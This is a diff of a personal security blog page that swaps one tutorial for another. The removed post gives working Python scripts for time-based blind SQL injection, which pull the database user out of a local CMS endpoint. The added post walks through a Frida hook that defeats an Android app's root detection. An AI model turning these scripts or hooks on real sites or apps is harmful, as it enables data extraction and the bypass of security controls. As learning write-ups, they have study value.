@@ -5,23 +5,23 @@
 <!-- Introducing the head tag -->
 
 <!-- Begin Jekyll SEO tag v2.6.1 -->
-<title>SQL注入-失了智的盲注尝试 | sueisok</title>
+<title>Android-绕过root检测 | sueisok</title>
 <meta name="generator" content="Jekyll v3.8.6" />
-<meta property="og:title" content="SQL注入-失了智的盲注尝试" />
+<meta property="og:title" content="Android-绕过root检测" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="这两天套娃网上的教程，实现了一下盲注脚本，在寻觅的过程中，看到一个使用MySQL位函数和运算符进行基于时间的高效SQL盲注，使用“右移”运算符(»)，枚举从SQL查询返回值的二进制位" />
-<meta property="og:description" content="这两天套娃网上的教程，实现了一下盲注脚本，在寻觅的过程中，看到一个使用MySQL位函数和运算符进行基于时间的高效SQL盲注，使用“右移”运算符(»)，枚举从SQL查询返回值的二进制位" />
-<link rel="canonical" href="http://localhost:4000/blog/stupid-sqli-blind/" />
-<meta property="og:url" content="http://localhost:4000/blog/stupid-sqli-blind/" />
+<meta name="description" content="有些app安装到已root的手机上会提示手机被root，不能使用🙄那还叫人怎么玩啊，摔" />
+<meta property="og:description" content="有些app安装到已root的手机上会提示手机被root，不能使用🙄那还叫人怎么玩啊，摔" />
+<link rel="canonical" href="http://localhost:4000/blog/hookroot/" />
+<meta property="og:url" content="http://localhost:4000/blog/hookroot/" />
 <meta property="og:site_name" content="sueisok" />
 <meta property="og:type" content="article" />
-<meta property="article:published_time" content="2020-06-05T15:10:09+08:00" />
+<meta property="article:published_time" content="2020-07-08T18:00:09+08:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="SQL注入-失了智的盲注尝试" />
+<meta property="twitter:title" content="Android-绕过root检测" />
 <meta name="twitter:site" content="@your_name" />
 <meta name="google-site-verification" content="XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" />
 <script type="application/ld+json">
-{"@type":"BlogPosting","headline":"SQL注入-失了智的盲注尝试","dateModified":"2020-06-05T15:10:09+08:00","datePublished":"2020-06-05T15:10:09+08:00","url":"http://localhost:4000/blog/stupid-sqli-blind/","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/blog/stupid-sqli-blind/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/banner.png"}},"description":"这两天套娃网上的教程，实现了一下盲注脚本，在寻觅的过程中，看到一个使用MySQL位函数和运算符进行基于时间的高效SQL盲注，使用“右移”运算符(»)，枚举从SQL查询返回值的二进制位","@context":"https://schema.org"}</script>
+{"@type":"BlogPosting","headline":"Android-绕过root检测","dateModified":"2020-07-08T18:00:09+08:00","datePublished":"2020-07-08T18:00:09+08:00","url":"http://localhost:4000/blog/hookroot/","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/blog/hookroot/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/banner.png"}},"description":"有些app安装到已root的手机上会提示手机被root，不能使用🙄那还叫人怎么玩啊，摔","@context":"https://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
 
 <script type="application/ld+json">
@@ -88,7 +88,7 @@
 <link href="/assets/icon.png" rel="apple-touch-icon-precomposed" />
 <!-- Android Lolipop Theme Color -->
 <!-- <meta name="theme-color" content="#1464FB"> -->
-<title>SQL注入-失了智的盲注尝试</title>
+<title>Android-绕过root检测</title>
 <!-- Baidu statistics -->
 
 <!-- Google Analytics -->
@@ -105,7 +105,7 @@
 
 
 <!-- Android Lolipop Theme Color -->
-<meta name="theme-color" content=" rgb(122,103,138) ">
+<meta name="theme-color" content=" rgb(50,205,50) ">
 </head>
 <body onload="loaderFunc()" data-spy="scroll" data-target="#toc" data-offset="20">
 
@@ -132,7 +132,7 @@
 <a id="htmlup" name="htmlup"></a>
 <!-- Introduce blog post options -->
 
-<header id="post-header" style="background-color:rgb(122,103,138);">
+<header id="post-header" style="background-color:rgb(50,205,50);">
   <div class="top-center">
       <div class="logo">
           <a href="/" title="my awesome webtitle" style="color: white;">sueisok</a>
@@ -181,7 +181,7 @@
 <!-- Introducing the blog post style -->
 <!-- Version one garbage -->
 <!-- <div class="wow fadeIn top" data-wow-duration="3.5s" >
-    <span class="wow fadeInUp" data-wow-delay="0.2s">SQL注入-失了智的盲注尝试</span>
+    <span class="wow fadeInUp" data-wow-delay="0.2s">Android-绕过root检测</span>
     <span class="wow fadeInUp" data-wow-delay="0.4s"></span>
     <span class="wow fadeInUp" data-wow-delay="0.4s"></span>
     <span class="wow fadeInUp" data-wow-delay="0.6s">Author&nbsp;&nbsp;|&nbsp;&nbsp;true</span>
@@ -189,34 +189,34 @@
 
 <!--Version 2 switchable page -->
 
-<div class="post-top" style="background-color:rgb(122,103,138);">
+<div class="post-top" style="background-color:rgb(50,205,50);">
   <!-- Page width is greater than 800px -->
   <div class="left-area">
     
-      <a href="/blog/hookroot/" class="btn bounceInLeft animated" onmouseover="showLeft();this.style.color='rgb(122,103,138)';" onmouseout="goneLeft();this.style.color='rgba(0,0,0,.2)';"><</a>
-      <div id="left-tab" style="display:none;"><span class="left-san"></span><span class="left-main" style="color:rgb(122,103,138);"><sapn class="main">Android-绕过root检测</sapn></span></div>
+      <a href="javascript:;" class="btn bounceInLeft animated" onmouseover="showLeft();this.style.color='rgb(50,205,50)';" onmouseout="goneLeft();this.style.color='rgba(0,0,0,.2)';"><</a>
+      <div id="left-tab" style="display:none;"><span class="left-san"></span><span class="left-main" style="color:rgb(50,205,50);"><sapn class="main">No previous page</sapn></span></div>
     
   </div>
   <div class="post-titlearea">
-    <span class="wow fadeInUp" data-wow-delay="0.2s">SQL注入-失了智的盲注尝试</span>
+    <span class="wow fadeInUp" data-wow-delay="0.2s">Android-绕过root检测</span>
     <!-- <span class="wow fadeInUp" data-wow-delay="0.4s"></span> -->
     <!-- <span class="wow fadeInUp" data-wow-delay="0.4s"></span> -->
     <!-- <span class="wow fadeInUp" data-wow-delay="0.6s">Author&nbsp;&nbsp;|&nbsp;&nbsp;true</span> -->
   </div>
   <div class="right-area">
     
-      <a href="/blog/sqli-time-based/" class="btn bounceInRight self-animated" onmouseover="showRight();this.style.color='rgb(122,103,138)';" onmouseout="goneRight();this.style.color='rgba(0,0,0,.2)';">></a>
-      <div id="right-tab" style="display:none;"><span class="right-san"></span><span class="right-main" style="color:rgb(122,103,138);"><sapn class="main">SQL注入-时间盲注整理</sapn></span></div>
+      <a href="/blog/stupid-sqli-blind/" class="btn bounceInRight self-animated" onmouseover="showRight();this.style.color='rgb(50,205,50)';" onmouseout="goneRight();this.style.color='rgba(0,0,0,.2)';">></a>
+      <div id="right-tab" style="display:none;"><span class="right-san"></span><span class="right-main" style="color:rgb(50,205,50);"><sapn class="main">SQL注入-失了智的盲注尝试</sapn></span></div>
     
   </div>
 
   <!-- Page width is less than 800px -->
   <div class="post-changearea">
     
-      <a href="/blog/hookroot/" class="leftchange" style="border-right: 1px solid rgb(122,103,138);border-bottom: 2px solid rgb(122,103,138);"><span>Previous<br><br>Android-绕过root检测</span></a>
+      <a href="javascript:;" class="leftchange" style="border-right: 1px solid rgb(50,205,50);border-bottom: 2px solid rgb(50,205,50);"><span><br>No previous one</span></a>
     
     
-      <a href="/blog/sqli-time-based/" class="rightchange" style="border-left: 1px solid rgb(122,103,138);border-bottom: 2px solid rgb(122,103,138);"><span>Next<br><br>SQL注入-时间盲注整理</span></a>
+      <a href="/blog/stupid-sqli-blind/" class="rightchange" style="border-left: 1px solid rgb(50,205,50);border-bottom: 2px solid rgb(50,205,50);"><span>Next<br><br>SQL注入-失了智的盲注尝试</span></a>
     
   </div>
 </div>
@@ -226,220 +226,237 @@
   
 
     
-      <div class="postpage-subtitle" style="border-left: 8px solid rgb(122,103,138); border-right: 8px solid rgb(122,103,138)">
-        Time Based With Python
+      <div class="postpage-subtitle" style="border-left: 8px solid rgb(50,205,50); border-right: 8px solid rgb(50,205,50)">
+        root？hook
       </div>
     
   
 
   <!-- Article content -->
  <ul id="markdown-toc">
-  <li><a href="#测试环境" id="markdown-toc-测试环境">测试环境</a></li>
-  <li><a href="#二分の盲注" id="markdown-toc-二分の盲注">二分の盲注</a></li>
-  <li><a href="#左移の盲注" id="markdown-toc-左移の盲注">左移の盲注</a></li>
-  <li><a href="#小小の总结" id="markdown-toc-小小の总结">小小の总结</a></li>
-  <li><a href="#匹配の盲注" id="markdown-toc-匹配の盲注">匹配の盲注</a></li>
+  <li><a href="#环境说明" id="markdown-toc-环境说明">环境说明</a></li>
+  <li><a href="#安装frida" id="markdown-toc-安装frida">安装frida</a>    <ul>
+      <li><a href="#安装frida客户端" id="markdown-toc-安装frida客户端">安装frida客户端</a></li>
+      <li><a href="#安装frida服务端" id="markdown-toc-安装frida服务端">安装frida服务端</a></li>
+    </ul>
+  </li>
+  <li><a href="#如何hook" id="markdown-toc-如何hook">如何hook</a>    <ul>
+      <li><a href="#絮絮叨叨如何反编译" id="markdown-toc-絮絮叨叨如何反编译">絮絮叨叨如何反编译</a></li>
+      <li><a href="#定位函数" id="markdown-toc-定位函数">定位函数</a></li>
+      <li><a href="#编写js" id="markdown-toc-编写js">编写js</a></li>
+      <li><a href="#开始hook" id="markdown-toc-开始hook">开始hook</a></li>
+    </ul>
+  </li>
   <li><a href="#refer" id="markdown-toc-refer">Refer</a></li>
 </ul>
-<p>这两天套娃网上的教程，实现了一下盲注脚本，在寻觅的过程中，看到一个<a href="https://www.freebuf.com/articles/web/188029.html">使用MySQL位函数和运算符进行基于时间的高效SQL盲注</a>，使用“右移”运算符(»)，枚举从SQL查询返回值的二进制位</p>
+<p>有些app安装到已root的手机上会提示手机被root，不能使用🙄那还叫人怎么玩啊，摔</p>
 
-<p>高效厚，高效吗？俺来试一试</p>
+<p><img src="../../assets/blog_pic/20200708_hookroot/root.png" alt="avatar" /></p>
 
-<h1 id="测试环境">测试环境</h1>
+<p>然后通过各种套娃别人的方法，来绕过一下</p>
 
-<p>测试环境是一个cms的sql注入漏洞，来源我就不说了，这里的sql注入就是没有过滤，但是是POST提交的方式，然后我改成了GET的方式，如果是POST的话，就是加一个data={}哈哈哈</p>
+<h1 id="环境说明">环境说明</h1>
 
-<p>这里木有加多线程进去，高速公路上比一比</p>
+<table>
+  <thead>
+    <tr>
+      <th>环境</th>
+      <th>版本</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>win</td>
+      <td>10</td>
+    </tr>
+    <tr>
+      <td>android</td>
+      <td>夜神模拟器安卓7</td>
+    </tr>
+    <tr>
+      <td>frida</td>
+      <td>12.10.4</td>
+    </tr>
+  </tbody>
+</table>
 
-<h1 id="二分の盲注">二分の盲注</h1>
+<h1 id="安装frida">安装frida</h1>
 
-<p>二分法就是，把一个顺序的区间分为两半，取中间的数，目标大于中间的数就舍弃前半段，目标小于中间的数就舍弃后半段。我这里给的区间是30-150，我先按照我的理解，写了一下二分法盲注：</p>
+<p><strong>Frida</strong>是一款基于python + javascript 的hook框架，适用于android/ios/linux/win/osx等平台。<strong>Frida</strong>的动态代码执行功能，主要是在它的核心引擎Gum中用C语言来实现的。（抄的</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#二分法
-import requests
-import datetime
-import time
+<h2 id="安装frida客户端">安装frida客户端</h2>
 
-headers={
-'Host': '127.0.0.1',
-'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36',
-'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
-'Accept-Encoding': 'gzip, deflate',
-'X-Requested-With': 'XMLHttpRequest',
-'Origin': 'http://127.0.0.1',
-'Connection': 'close',
-'Referer': 'http://127.0.0.1/goods/1.html',
-'Cookie': 'UM_distinctid=1720c8e9f960-0fd572df9b95ed-374c2c08-15f900-1720c8e9f9a7; CNZZDATA1277972876=1114558-1589348573-%7C1589953788; PHPSESSID=hp0i4j6to52gg338ven8c69k8k'
-}
+<p>用<strong>pip</strong>就可以安装<strong>frida</strong></p>
 
-def blind(k,i):
-	realurl = '''http://127.0.0.1/shop/tijiao.html'''
-	payload = '''?guige=s&amp;shuliang=1&amp;id=1)and+if(ord(substr(user(),%d,1))&gt;=%d,sleep(4),1)--''' % (k,i)
-	url = realurl + payload
-	time1 = datetime.datetime.now()
-	r = requests.get(url=url,headers=headers)
-	time2 = datetime.datetime.now()
-	sec = (time2 - time1).seconds
-	return sec
-
-def user_name():
-	name = ''
-	for k in range(1,15):#长度
-		mini=30
-		maxi=150
-		midi= mini+(maxi-mini)//2
-
-		for j in range(1,8):
-			if(blind(k,midi)&lt;3):
-				maxi = midi
-				midi = mini+((midi-mini)//2)
-			else:
-				mini = midi
-				midi = mini+((maxi-midi)//2)
-		name += chr(midi)
-		print('user_name:',name)
-		
-user_name()
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>λ pip install frida
 </code></pre></div></div>
 
-<p>用户名root@loacalhost，用时<strong>241.9s</strong></p>
+<p>但是我没成功，可以升级<strong>pip</strong>试一下，也可以尝试</p>
 
-<h1 id="左移の盲注">左移の盲注</h1>
-
-<p><strong>r</strong>的ascii码是114，变二进制是<strong>0111 0010</strong>，分别左移7位、6位看一下</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select 114&gt;&gt;7;
-+--------+
-| 114&gt;&gt;7 |
-+--------+
-|      0 |
-+--------+
-1 row in set (0.00 sec)
-
-mysql&gt; select 114&gt;&gt;6;
-+--------+
-| 114&gt;&gt;6 |
-+--------+
-|      1 |
-+--------+
-1 row in set (0.00 sec)
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>λ pip install frida-tools
 </code></pre></div></div>
 
-<p>字符串的第一位都是0，所以我们只需要核对后七位，也就是从左移6开始</p>
+<p>但是我没成功，最终我在管理员权限下，成功了😑</p>
 
-<p>然后按照我的理解，写了一下逐位左移的盲注，感觉写的好傻 啊，已经好久没写代码了，属于头一天写第二天就看不懂那种：</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import requests
-import datetime
-import time
-
-headers={
-'Host': '127.0.0.1',
-'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36',
-'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
-'Accept-Encoding': 'gzip, deflate',
-'X-Requested-With': 'XMLHttpRequest',
-'Origin': 'http://127.0.0.1',
-'Connection': 'close',
-'Referer': 'http://127.0.0.1/goods/1.html',
-'Cookie': 'UM_distinctid=1720c8e9f960-0fd572df9b95ed-374c2c08-15f900-1720c8e9f9a7; CNZZDATA1277972876=1114558-1589348573-%7C1589953788; PHPSESSID=hp0i4j6to52gg338ven8c69k8k'
-}
-
-def blind(k,i,j):
-	realurl = '''http://127.0.0.1/shop/tijiao.html'''
-	payload = '''?guige=s&amp;shuliang=1&amp;id=1)and+if((ascii((substr(user(),%d,1)))+&gt;&gt;+%d)=%d,sleep(4),1)--''' % (k,i,j)
-	url = realurl + payload
-	time1 = datetime.datetime.now()
-	r = requests.get(url=url,headers=headers)
-	time2 = datetime.datetime.now()
-	sec = (time2 - time1).seconds
-	return sec
-
-def user_name():
-	name = ''
-	for k in range(1,15):
-		j = 1
-		for i in range(6,-1,-1):
-			if((j%2)==0):
-				j += 1
-			time_blind=blind(k,i,j)
-			if (time_blind&gt;1):
-				if(i == 0):
-					name += chr(j)
-					break
-				else:
-					j = j * 2 + 1
-			else:
-				if(i == 0):
-					name += chr(j - 1)
-					break
-				else:
-					j = (j - 1) * 2
-		print('user_name:',name)
-
-user_name()
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>λ frida --version
+12.10.4
 </code></pre></div></div>
 
-<p>用户名root@loacalhost，用时<strong>247s</strong>(ˉ﹃ˉ)</p>
+<p>就说明你拥有了<strong>frida</strong>💥</p>
 
-<h1 id="小小の总结">小小の总结</h1>
+<h2 id="安装frida服务端">安装frida服务端</h2>
 
-<p>🔥为了公平起见，两个延时都是sleep(4)</p>
+<p>首先<a href="https://github.com/frida/frida/releases/">选择</a>合适的<strong>frida-server</strong>，怎么选呢？我们可以用<strong>adb</strong>查看我们的手机是什么<strong>cpu</strong>版本</p>
 
-<p>🔥二分241.9左移247用时差不多，因为二分法是每次除以2，二进制中左移其实也是2倍计算</p>
+<p>用<strong>adb</strong>连接手机，我这里是夜神模拟器，进入模拟器安装所在文件夹</p>
 
-<p>🔥如果你确定盲注的目标的字符范围，其实有更快的方法，如下</p>
-
-<h1 id="匹配の盲注">匹配の盲注</h1>
-
-<p>先要有一个列表，这里我把我能用到的放了进去，数字，大小写字母，和一个@，然后逐个匹配，如果匹配到了就是他了</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import requests
-import datetime
-import time
-
-headers={
-'Host': '127.0.0.1',
-'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36',
-'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
-'Accept-Encoding': 'gzip, deflate',
-'X-Requested-With': 'XMLHttpRequest',
-'Origin': 'http://127.0.0.1',
-'Connection': 'close',
-'Referer': 'http://127.0.0.1/goods/1.html',
-'Cookie': 'UM_distinctid=1720c8e9f960-0fd572df9b95ed-374c2c08-15f900-1720c8e9f9a7; CNZZDATA1277972876=1114558-1589348573-%7C1589953788; PHPSESSID=hp0i4j6to52gg338ven8c69k8k'
-}
-
-def user_name():
-	name = ''
-	for i in range(1,15):
-		for j in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@':
-			realurl = '''http://127.0.0.1/shop/tijiao.html'''
-			payload = '''?guige=s&amp;shuliang=1&amp;id=1)and+if(substr(user(),%d,1)='%s',sleep(4),1)--''' % (i,j)
-			url = realurl + payload
-
-			time1 = datetime.datetime.now()
-			r = requests.get(url=url,headers=headers)
-			time2 = datetime.datetime.now()
-
-			sec = (time2 - time1).seconds
-			if sec &gt;= 3:
-				name += j
-				break
-		print('user_name:',name)
-
-user_name()
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>λ nox_adb.exe connect 127.0.0.1:62026
+already connected to 127.0.0.1:62026
 </code></pre></div></div>
 
-<p>用户名root@loacalhost，用时<strong>76.8s</strong>不香吗(。・∀・)ノ</p>
+<p>查看是否连接</p>
 
-<p>ps：但如果你的列表里漏了一些特殊字符，那就漏了，所以还是二分和左移比较靠谱全面</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>λ nox_adb.exe devices
+List of devices attached
+127.0.0.1:62026 device
+</code></pre></div></div>
+
+<p>进入某台手机：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>λ adb -s 127.0.0.1:62026 shell
+</code></pre></div></div>
+
+<p>查看<strong>cpu</strong>版本：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>R11:/ # getprop ro.product.cpu.abi
+x86
+</code></pre></div></div>
+
+<p>是<strong>x86</strong>，那就选择对应的如图下载</p>
+
+<p><img src="../../assets/blog_pic/20200708_hookroot/x86.png" alt="avatar" /></p>
+
+<p>解压后将文件放入手机</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>λ adb push frida-server-12.10.4-android-x86 /data/local/tmp
+[100%] /data/local/tmp/frida-server-12.10.4-android-x86
+</code></pre></div></div>
+
+<p>设置端口转发到<strong>pc端</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>λ adb forward tcp:27042 tcp:27042
+
+λ adb forward tcp:27043 tcp:27043
+</code></pre></div></div>
+
+<p>再次进入手机，修改<strong>frida-server</strong>权限，启动<strong>frida</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>λ adb shell
+R11:/ # cd /data/local/tmp
+R11:/data/local/tmp # ls
+frida-server-12.10.4-android-x86
+R11:/data/local/tmp # chmod 755 frida-server-12.10.4-android-x86
+R11:/data/local/tmp # ./frida-server-12.10.4-android-x86
+</code></pre></div></div>
+
+<p>再打开另一个<strong>cmd</strong>：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>λ frida-ps -U
+</code></pre></div></div>
+
+<p>如果出现Android的进程，则代表安装成功。</p>
+
+<p><img src="../../assets/blog_pic/20200708_hookroot/psu.png" alt="avatar" /></p>
+
+<h1 id="如何hook">如何hook</h1>
+
+<p>我们遇到的问题是<strong>app</strong>刚启动检测到<strong>root</strong>就关掉，所以我们要寻找是在哪检测到<strong>root</strong>的，这是问题的切入点</p>
+
+<p>二话不说掏出apk反编译（如果你手里的apk因为被加固了等情况无法反编译，出门左转再见</p>
+
+<h2 id="絮絮叨叨如何反编译">絮絮叨叨如何反编译</h2>
+
+<p>把<strong>apk</strong>的后缀改为<strong>zip</strong>，进行解压，解压后打开找到<strong>dex</strong>后缀的文件</p>
+
+<p><img src="../../assets/blog_pic/20200708_hookroot/dex.png" alt="avatar" /></p>
+
+<p>用<strong>dex2jar</strong>反编译</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>λ d2j-dex2jar.bat classes.dex
+</code></pre></div></div>
+
+<p>会生成一个<strong>jar</strong>文件，这里是<strong>classes-dex2jar.jar</strong></p>
+
+<p>然后用<strong>jadx-gui</strong>打开</p>
+
+<p><img src="../../assets/blog_pic/20200708_hookroot/jadx.png" alt="avatar" /></p>
+
+<h2 id="定位函数">定位函数</h2>
+
+<p>全局搜索<strong>手机已被ROOT，请注意使用安全</strong>，我们发现确有此句</p>
+
+<p><img src="../../assets/blog_pic/20200708_hookroot/message.png" alt="avatar" /></p>
+
+<p>这里的逻辑就是，如果<strong>c</strong>，那就弹框这句话，那么<strong>c</strong>的意思？大概就是判断手机是否被<strong>root</strong>了，我们发现确有此<strong>c</strong></p>
+
+<p><img src="../../assets/blog_pic/20200708_hookroot/c.png" alt="avatar" /></p>
+
+<p>如果存在这两个文件，说明手机被<strong>root</strong>了，不存在就返回<strong>false</strong></p>
+
+<h2 id="编写js">编写js</h2>
+
+<p><strong>hookroot.js</strong>：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Java.perform(function x() {
+    var application = Java.use("android.app.Application");
+    application.attach.overload('android.content.Context').implementation = function (context) {
+        var result = this.attach(context);
+        var classloader = context.getClassLoader();
+        Java.classFactory.loader = classloader;
+        var funk = Java.classFactory.use("com.xxx.xxx.xxx.xxx.HomeActivity");
+        funk.c.overload().implementation = function () {
+            return false;
+        }		
+    }
+});
+</code></pre></div></div>
+
+<p><strong>com.xxx.xxx.xxx.xxx.HomeActivity</strong>是我们那个函数所在的<strong>class</strong></p>
+
+<p><strong>funk.c</strong>是我们定位到识别<strong>root</strong>，让他返回<strong>false</strong></p>
+
+<h2 id="开始hook">开始hook</h2>
+
+<p>先打开<strong>app</strong>，界面还是<strong>手机已被ROOT，请注意使用安全</strong></p>
+
+<p>此时，<strong>frida</strong>启动<strong>hook</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>λ frida -U -f com.xxx.xxx.xxx -l hookroot.js
+</code></pre></div></div>
+
+<p><strong>com.xxx.xxx.xxx</strong>是我们的<strong>apk</strong>包名</p>
+
+<p>看到<strong>frida</strong>启动，<strong>app</strong>关闭，提示</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Use %resume to let the main thread start executing!
+</code></pre></div></div>
+
+<p>然后根据提示输入</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%resume
+</code></pre></div></div>
+
+<p><img src="../../assets/blog_pic/20200708_hookroot/resume.png" alt="avatar" /></p>
+
+<p><strong>app</strong>启动后就没有<strong>root</strong>提示，可以正常登录了👶</p>
 
 <h1 id="refer">Refer</h1>
 
-<p><a href="fuzhi">https://www.freebuf.com/articles/web/188029.html</a></p>
+<p><a href="fuzhi">https://www.jianshu.com/p/c349471bdef7</a></p>
 
-<p><a href="zhantie">https://www.freebuf.com/articles/web/231741.html</a></p>
+<p><a href="zhantie">https://www.cnblogs.com/luoyesiqiu/p/10718997.html</a></p>
+
+<p><a href="？">https://blog.csdn.net/cjx529377/article/details/95802532</a></p>
 
   <!-- Introducing the share module -->
   
@@ -545,7 +562,7 @@ user_name()
   
 
   
-    / Stupid sqli blind
+    / Hookroot
   
 
 </div>
